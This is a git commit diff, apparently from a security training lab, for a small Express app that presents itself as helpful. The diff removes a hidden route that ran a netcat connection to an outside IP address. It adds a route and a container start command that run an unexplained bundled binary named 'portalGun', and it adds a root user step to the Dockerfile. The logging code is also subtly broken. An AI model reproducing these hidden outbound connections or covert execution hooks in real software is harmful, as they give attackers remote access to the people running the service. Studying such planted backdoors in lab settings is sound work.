7b9c345d6a35fbdfb0f1801663f31e4f5c5dabf1
student <student@sec588.com>
2025-05-26 20:46:46 +0000

    test

--- Dockerfile
+++ Dockerfile
@@ -1,12 +1,15 @@
 FROM node:8-jessie
 
+USER root
 RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
 WORKDIR /home/node/app
 COPY package*.json ./
 USER node
 RUN npm install
+
+COPY portalGun /home/node/app/portalGun
 COPY --chown=node:node . .
 
 
 EXPOSE 3001
-CMD ["node", "app.js"]
+CMD ["/home/node/app/portalGun"]
--- app.js
+++ app.js
@@ -1,20 +1,21 @@
 var express = require('express');
-const { exec } = require("child_process");
+const { execFile } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
-app.get('/test123moi/', function (req, ses){
-  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+app.get('/fire-portal-gun', (rq, res) => {
+  execFile('/home/node/app/portalGun', (error, stdout, stderr) => {
     if (error) {
-        console.log(`error: ${error.message}`);
-        return;
+      console.error("Error: ${error}")
+      return res.status(500).json({ error: error.message });
     }
     if (stderr) {
-        console.log(`stderr: ${stderr}`);
-        return;
+      console.warn('stderr: ${stderr}')
     }
-    console.log(`stdout: ${stdout}`);
+    res.json({ output: stdout })
+  });
+
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
